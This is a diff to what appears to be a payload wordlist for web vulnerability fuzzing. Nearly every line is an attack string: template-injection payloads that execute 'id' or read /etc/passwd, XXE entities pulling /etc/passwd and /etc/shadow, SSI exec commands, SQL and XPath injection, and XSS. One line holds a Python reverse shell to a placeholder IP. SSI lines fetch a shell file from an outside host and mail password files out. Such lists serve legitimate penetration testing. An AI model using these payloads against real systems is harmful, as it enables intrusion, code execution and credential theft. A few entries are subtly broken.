@@ -1,8 +1,27 @@
+-
+-1
+;
+:
+' or ''='
+' or '1'='1
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://xss.rocks/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+(Tnn96)
 [[${42*42}]]
 [[7*7]]
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 [=7*7]
 [7*7]
+[Tnn96]
+]>
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 {{ [].class.base.subclasses() }}
@@ -23,6 +42,7 @@
 {{['id']|filter('system')}}
 {{{42*42}}}
 {{= 7*7}}
+{{= Tnn96}}
 {{=42*42}}
 {{1}}
 {{2*2}}[[3*3]]
@@ -2329,6 +2349,7 @@
 {{Title}}
 {{titlefeat}}
 {{titles}}
+{{Tnn96}}
 {{to}}
 {{To}}
 {{toboard}}
@@ -2645,20 +2666,37 @@
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 {^xyzm42}1764{/xyzm42}
+{= Tnn96}
 {$smarty.version}
 {42*42}
 {7*7}
 {php}echo `id`;{/php}
+{Tnn96}
+@
 @(1+2)
 @(6+5)
 @(7*7)
+@*
+*
 *{7*7}
 *{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+*/*
+/
+//
+//*
+&apos;XoiZR
+&lt;? Tnn96 ?&gt;
+&lt;?Tnn96 ?&gt;
+&lt;% Tnn96 %&gt;
+&lt;%= Tnn96 %&gt;
+&lt;Tnn96&gt;
+&quot;XoiZR
 #{ 3 * 3 }
 #{ 7 * 7 }
 #{3*3}
 #{42*42}
 #{7*7}
+%
 %23%7B%203%20%2A%203%20%7D%0A
 %23%7B3%2A3%7D%0A
 %24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A
@@ -2708,13 +2746,104 @@
 %7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A
 %7B%7Bself%7D%7D%0A
 %7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A
++
+<!--#config errmsg="File not found, informs users and password"-->
+<!--#config timefmt="A %B %d %Y %r"-->
+<!--#echo var="auth_type" -->
+<!--#echo var="content_length" -->
+<!--#echo var="content_type" -->
+<!--#echo var="date_gmt" -->
+<!--#echo var="date_local" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="document_name" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="document_root" -->
+<!--#echo var="document_uri" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="forwarded" -->
+<!--#echo var="from" -->
+<!--#echo var="gateway_interface" -->
+<!--#echo var="http_accept_charset" -->
+<!--#echo var="http_accept_encoding" -->
+<!--#echo var="http_accept_language" -->
+<!--#echo var="http_accept" -->
+<!--#echo var="http_client_ip" -->
+<!--#echo var="http_connection" -->
+<!--#echo var="http_cookie" -->
+<!--#echo var="http_form" -->
+<!--#echo var="http_host" -->
+<!--#echo var="http_referer" -->
+<!--#echo var="http_ua_cpu" -->
+<!--#echo var="http_ua_os" -->
+<!--#echo var="http_user_agent" -->
+<!--#echo var="last_modified" -->
+<!--#echo var="netsite_root" -->
+<!--#echo var="page_count" -->
+<!--#echo var="path_info_translated" -->
+<!--#echo var="path_info" -->
+<!--#echo var="path_translated" -->
+<!--#echo var="path" -->
+<!--#echo var="query_string_unescaped" -->
+<!--#echo var="query_string" -->
+<!--#echo var="remote_addr" -->
+<!--#echo var="remote_host" -->
+<!--#echo var="remote_ident" -->
+<!--#echo var="remote_port" -->
+<!--#echo var="remote_user" -->
+<!--#echo var="request_method" -->
+<!--#echo var="request_uri" -->
+<!--#echo var="script_filename" -->
+<!--#echo var="script_name" -->
+<!--#echo var="script_uri" -->
+<!--#echo var="script_url" -->
+<!--#echo var="server_addr" -->
+<!--#echo var="server_admin" -->
+<!--#echo var="server_name -->
+<!--#echo var="server_port" -->
+<!--#echo var="server_protocol" -->
+<!--#echo var="server_software" -->
+<!--#echo var="site_htmlroot" -->
+<!--#echo var="total_hits" -->
+<!--#echo var="tz" -->
+<!--#echo var="unique_id" -->
+<!--#echo var="user_name" -->
+<!--#exec cmd="/bin/ls /" -->
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="cd C:\WINDOWS\System32">
+<!--#exec cmd="dir" -->
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="ls" -->
+<!--#exec cmd="mail email@dom.tld <mailto:email@dom.tld> < cat /etc/passwd" --><br/>
+<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
+<!--#exec cmd="whoami"-->
+<!--#flastmod virtual="echo.html" -->
+<!--#fsize file="ssi.shtml" -->
+<!--#include file=?UUUUUUUU...UU?-->
+<!--#printenv -->
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
+<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
 <?=7*7?>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 <%= 3 * 3 %>
 <%= 7 * 7 %>
 <%= 7*7 %>
 <%= File.open('/etc/passwd').read %>
 <%=42*42 %>
+<name>','')); phpinfo(); exit;/*</name>
+<pre><!--#echo var="DATE_LOCAL" --> </pre>
+<pre><!--#exec cmd="dir" --></pre>
+<pre><!--#exec cmd="ls" --></pre>
+<pre><!--#exec cmd="whoami"--></pre>
+$
 ${"freemarker.template.utility.Execute"?new()("id")}
 ${{<%[%'"}}%\
 ${{3*3}}
@@ -2782,4 +2911,18 @@ ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(java.lang.System).getenv()}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
+0
+0.00005
+0.1
+0.9
+1
+1.7976931348623157e+308
 42*42
+5e-10
+5e-324
+count(/child::node())
+false
+null
+true
+x' or 1=1 or 'x'='y
+x' or name()='username' or 'x'='y
